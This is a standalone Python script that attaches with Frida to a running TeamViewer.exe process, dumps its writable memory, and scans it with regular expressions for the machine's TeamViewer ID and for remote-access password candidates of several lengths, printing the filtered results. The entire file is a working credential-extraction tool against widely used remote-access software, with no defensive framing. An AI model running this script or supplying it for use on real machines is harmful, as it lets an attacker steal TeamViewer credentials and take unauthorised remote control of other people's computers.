# Python3

import frida
import binascii
import re

PERMS = 'rw-'
process = "TeamViewer.exe"
session = frida.attach(process)
print("Attached to process.")
mems = session.enumerate_ranges(PERMS)

data_dump = []

try:
    for mem in mems:
        dump = session.read_bytes(mem.base_address, mem.size)
        data_dump.append(dump)
    session.detach()
except:
    print("Memory access violation. Try again")
    quit(0)

password_candidates10 = []
password_candidates8 = []
password_candidates6 = []
password_candidates4 = []
last_tv_id = ''


# ------------------------------
# Find TeamViewer ID in memory
# ------------------------------

re_tvid = re.compile('(3\d003\d003\d0020003\d003\d003\d0020003\d003\d003\d00)')

print('TeamViewer ID candidates:')
for index, data in enumerate(data_dump):
    data_hex = binascii.hexlify(data).decode('utf-8')
    tvids = re_tvid.findall(data_hex)
    for tvid in tvids:
        if tvid != last_tv_id:
            last_tv_id = tvid
            offset = data_hex.index(tvid)
            tvid = binascii.unhexlify( tvid.replace('00', '').replace('20', '') ).decode('utf-8')
            print(tvid)

print('-' * 30)


# ------------------------------
# Find passwords in memory
# ------------------------------

re_passwd10 = re.compile('(?:0088|0000)((?:[2-7][0-9a-f]00){10})0000')
re_passwd8  = re.compile('88((?:3[0-9]00|[67][0-9a-f]00){8})0000')
re_passwd6  = re.compile('00\d\d((?:3[0-9]00|[67][0-9a-f]00){6})0000')
re_passwd4  = re.compile('(?:2b02|0000)((?:3[0-9]00){4})0000')

for index, data in enumerate(data_dump):
    data_hex = binascii.hexlify(data).decode('utf-8')
    passwd10 = re_passwd10.findall(data_hex)
    passwd8  = re_passwd8.findall(data_hex)
    passwd6  = re_passwd6.findall(data_hex)
    passwd4  = re_passwd4.findall(data_hex)

    if passwd10:
        for passw in passwd10:
            passw = binascii.unhexlify( passw.replace('00', '').replace('20', '') ).decode('utf-8')
            if not re.findall('teamviewer|windows|system|image|quirk', passw, re.IGNORECASE):
                password_candidates10.append(passw)

    if passwd8:
        for passw in passwd8:
            passw = binascii.unhexlify( passw.replace('00', '').replace('20', '') ).decode('utf-8')
            password_candidates8.append(passw)

    if passwd6:
        for passw in passwd6:
            passw = binascii.unhexlify( passw.replace('00', '').replace('20', '') ).decode('utf-8')
            password_candidates6.append(passw)

    if passwd4:
        for passw in passwd4:
            passw = binascii.unhexlify( passw.replace('00', '').replace('20', '') ).decode('utf-8')
            password_candidates4.append(passw)


# ------------------------------
# Output password candidates
# ------------------------------

if password_candidates10:
    print("Possible passwords length = 10:")
    a = list((i, password_candidates10.count(i)) for i in password_candidates10)  # fill list value:count
    a = filter(lambda x: x[1] > 2, a)  # select where count > 2
    a = filter(lambda x: not re.findall('^[0-9\.\/]+$', x[0]), a)  # delete bad candidates
    a = filter(lambda x: not re.findall('^[a-z]+$', x[0]), a)  # delete bad candidates
    a = filter(lambda x: not re.findall('^[hmst:]+$', x[0]), a)  # delete bad candidates
    a = sorted(list(set(a)), key=lambda x: x[1], reverse=True)  # select unique and order by count desc
    for passw, id in a:
        if all(s not in passw for s in ['Intro', 'Exten', 'Clien', 'Proxy', 'Versi', 'Updat',
                                        'Build', 'Size', 'Servi', 'Micro', 'Range', 'Type']):
            print(passw)

if password_candidates8:
    print('-' * 30)
    print("Possible passwords length = 8:")
    for candidate in password_candidates8:

        # delete false positives
        if not re.match('^[a-z]+$', candidate) and not re.match('^[0-9]+$', candidate):
            print(candidate)

if password_candidates6:
    print('-' * 30)
    print("Possible passwords length = 6:")
    for candidate in password_candidates6:

        # Password is a mix of 3 lowercase chars and 3 digits
        numbers = sum(c.isdigit() for c in candidate)
        chars   = sum(c.isalpha() for c in candidate)
        if numbers == 3 and chars == 3:
            print(candidate)

if password_candidates4:
    print('-' * 30)
    print("Possible passwords length = 4:")

    a = list((i, password_candidates4.count(i)) for i in password_candidates4)  # fill list value:count
    # a = filter(lambda x: x[1] > 1, a)  # select where count > 1
    a = sorted(list(set(a)), key=lambda x: x[1], reverse=True)  # select unique and order by count desc

    for passw, id in a:
        if '000' not in passw: # remove false positive. almost not possible that password contains 000
            print(passw)

print('-' * 30)
